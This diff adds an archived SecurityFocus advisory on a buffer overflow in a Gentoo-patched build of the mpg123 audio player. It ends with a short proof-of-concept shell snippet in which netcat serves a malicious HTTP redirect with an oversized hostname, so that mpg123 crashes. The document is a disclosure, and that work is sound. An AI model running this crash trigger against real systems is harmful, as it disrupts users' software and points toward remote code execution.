@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/18794/info
+
+The mpg123 application is prone to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.
+
+This issue may allow remote attackers to execute arbitrary machine code in the context of the affected application.
+
+This issue is specific to a patch applied to the Gentoo Linux version of mpg123.
+
+The following commands are sufficient to demonstrate this issue by crashing affected applications:
+
+( echo -ne "HTTP/1.1 302 Found\r\nLocation: "
+echo -ne "http://fooooooooooooooooooooooooooooooooooooooooooooooooo/\r\n\r\n"
+)| nc -lp 8080 &
+
+mpg123 http://localhost:8080/
